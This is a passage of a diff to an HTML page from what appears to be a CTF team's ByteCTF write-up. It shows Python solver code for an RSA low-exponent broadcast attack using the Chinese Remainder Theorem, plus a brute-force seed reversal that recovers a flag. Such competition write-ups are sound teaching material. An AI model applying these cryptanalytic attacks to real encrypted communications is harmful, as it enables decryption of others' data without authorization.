 </span></span><span class="line"><span class="cl">	<span class="n">s</span> <span class="o">+=</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;L&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span>
 </span></span><span class="line"><span class="cl"><span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>rsa低指数广播攻击</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># -*- coding: cp936 -*-</span>
+</span></span></code></pre></div><p>rsa低指数广播攻击</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># -*- coding: cp936 -*-</span>
 </span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">gmpy2</span>
 </span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
 </span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">CRT</span><span class="p">(</span><span class="n">items</span><span class="p">):</span>
@@ -2259,32 +1240,9 @@ index.php</p>
 </span></span><span class="line"><span class="cl"><span class="n">realnum</span> <span class="o">=</span> <span class="n">gmpy2</span><span class="o">.</span><span class="n">iroot</span><span class="p">(</span><span class="n">gmpy2</span><span class="o">.</span><span class="n">mpz</span><span class="p">(</span><span class="n">x</span><span class="p">),</span> <span class="n">e</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">digits</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="s1">&#39;  [-]m is: &#39;</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="si">{:x}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">realnum</span><span class="p">))</span>
 </span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="s1">&#39;[!]All Done!&#39;</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>rsa也出了，然后最后一步逆种子Orz
+</span></span></code></pre></div><p>rsa也出了，然后最后一步逆种子Orz
 init_state = 0x87c303deaa0880e30957a1c3886a86f100c3a67381d022cd00ab8b3b028bd87c</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">bytes_to_long</span><span class="p">,</span> <span class="n">long_to_bytes</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">bytes_to_long</span><span class="p">,</span> <span class="n">long_to_bytes</span>
 </span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">generate_init_state</span><span class="p">(</span><span class="n">seed</span><span class="p">):</span>
 </span></span><span class="line"><span class="cl">    <span class="n">a</span> <span class="o">=</span> <span class="mi">0</span>
 </span></span><span class="line"><span class="cl">    <span class="c1"># print bin(seed)[2:]</span>
@@ -2301,97 +1259,105 @@ init_state = 0x87c303deaa0880e30957a1c3886a86f100c3a67381d022cd00ab8b3b028bd87c<
 </span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="n">generate_init_state</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">long_to_bytes</span><span class="p">(</span><span class="n">result</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;}&#39;</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">    	<span class="nb">print</span> <span class="n">long_to_bytes</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>根据异或性质直接爆回去
+</span></span></code></pre></div><p>根据异或性质直接爆回去
 <img src="https://hackmd.summershrimp.com/uploads/upload_e098d7bf802d700acd98ac57755507e7.png" alt=""></p>
 <p>坑点在于flag格式 爆了半天bytectf</p>
 
-        
-          <div class="blog-tags">
+            
+              <div class="blog-tags">
+                
+                  <a href="http://localhost:1313/tags/bytectf/">ByteCTF</a>
+                
+              </div>
+            
+
+            
+
             
               
-              <a href="http://localhost:1313/tags/bytectf/">ByteCTF</a>&nbsp;
+
+              
             
-          </div>
+          </article>
+        </section>
+
+        
+          <ul class="pager blog-pager">
+            
+              <li class="previous">
+                <a href="/post/2019-suctf-official-writeup/" data-toggle="tooltip" data-placement="top" title="SUCTF 2019 官方 Write up">&larr; Previous Post</a>
+              </li>
+            
+            
+              <li class="next">
+                <a href="/post/gxzyctf-2020-su-wu/" data-toggle="tooltip" data-placement="top" title="高校战“疫”网络安全分享赛 2020 SU Write Up">Next Post &rarr;</a>
+              </li>
+            
+          </ul>
         
 
         
-
-        
-          
-
-          
-        
-      </article>
-
-      
-        <ul class="pager blog-pager">
-          
-            <li class="previous">
-              <a href="http://localhost:1313/post/2019-suctf-official-writeup/" data-toggle="tooltip" data-placement="top" title="SUCTF 2019 官方 Write up">&larr; Previous Post</a>
-            </li>
-          
-          
-            <li class="next">
-              <a href="http://localhost:1313/post/gxzyctf-2020-su-wu/" data-toggle="tooltip" data-placement="top" title="高校战“疫”网络安全分享赛 2020 SU Write Up">Next Post &rarr;</a>
-            </li>
-          
-        </ul>
-      
-
-
-      
-
-    </div>
+      </div>
   </div>
 </div>
 
-      <footer>
+      <footer class="site-footer">
   <div class="container">
     
-    <div class="row">
-      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
-        <ul class="list-inline text-center footer-links">
+
+    <div class="site-footer__grid">
+      <div class="site-footer__brand">
+        <p class="site-footer__eyebrow">SU TEAM // BATTLE LOG</p>
+        <h2 class="site-footer__title">su-team</h2>
+        <p class="site-footer__tagline">
+          Built for team archives and competition writeups.
+          
+            <span class="site-footer__subline">Minimal noise, high signal, and fast navigation.</span>
+          
+        </p>
+      </div>
+
+      <div class="site-footer__meta">
+        <ul class="list-inline footer-links">
           
               <li>
                 
-		  <a href="https://ctftime.org/team/29641" title="CTFTime">
-		
-                  <span class="fa-stack fa-lg">
-                    <i class="fas fa-circle fa-stack-2x"></i>
-                    
-                      <img src="http://localhost:1313/img/ctftime.svg" title="CTFTime" alt="CTFTime" style="width:60%;height:60%;position:absolute;top:20%;left:20%">
-                    
-                  </span>
-                </a>
+                  <a href="https://ctftime.org/team/29641" title="CTFTime">
+                
+                    <span class="footer-link__icon">
+                      
+                        
+                          <img class="footer-social-img" src="/img/ctftime.svg" title="CTFTime" alt="CTFTime">
+                        
+                      
+                    </span>
+                  </a>
               </li>
               <li>
                 
-		  <a href="mailto:suers_xctf@126.com" title="Email me">
-		
-                  <span class="fa-stack fa-lg">
-                    <i class="fas fa-circle fa-stack-2x"></i>
-                    
-                      <i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
-                    
-                  </span>
-                </a>
+                  <a href="mailto:suers_xctf@126.com" title="Email me">
+                
+                    <span class="footer-link__icon">
+                      
+                        <i class="fas fa-envelope" aria-hidden="true"></i>
+                      
+                    </span>
+                  </a>
               </li>
               <li>
                 
-		  <a href="https://github.com/team-su" title="GitHub">
-		
-                  <span class="fa-stack fa-lg">
-                    <i class="fas fa-circle fa-stack-2x"></i>
-                    
-                      <i class="fab fa-github fa-stack-1x fa-inverse"></i>
-                    
-                  </span>
-                </a>
+                  <a href="https://github.com/team-su" title="GitHub">
+                
+                    <span class="footer-link__icon">
+                      
+                        <i class="fab fa-github" aria-hidden="true"></i>
+                      
+                    </span>
+                  </a>
               </li>
           
         </ul>
+
         <p class="credits copyright text-muted">
           
             
@@ -2406,10 +1372,10 @@ init_state = 0x87c303deaa0880e30957a1c3886a86f100c3a67381d022cd00ab8b3b028bd87c<
 
           
             &nbsp;&bull;&nbsp;
-            <a href="http://localhost:1313/">su-team</a>
+            <a href="/">su-team</a>
           
         </p>
-        
+
         <p class="credits theme-by text-muted">
           <a href="https://gohugo.io">Hugo v0.157.0</a> powered &nbsp;&bull;&nbsp; Theme <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a> adapted from <a href="https://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a>
           
@@ -2440,8 +1406,6 @@ init_state = 0x87c303deaa0880e30957a1c3886a86f100c3a67381d022cd00ab8b3b028bd87c<
 
 <script src="http://localhost:1313/js/main.js"></script><script src="http://localhost:1313/js/photoswipe.min.js"></script>
 <script src="http://localhost:1313/js/photoswipe-ui-default.min.js"></script><script src="http://localhost:1313/js/load-photoswipe.js"></script>
-
-
 
 
 
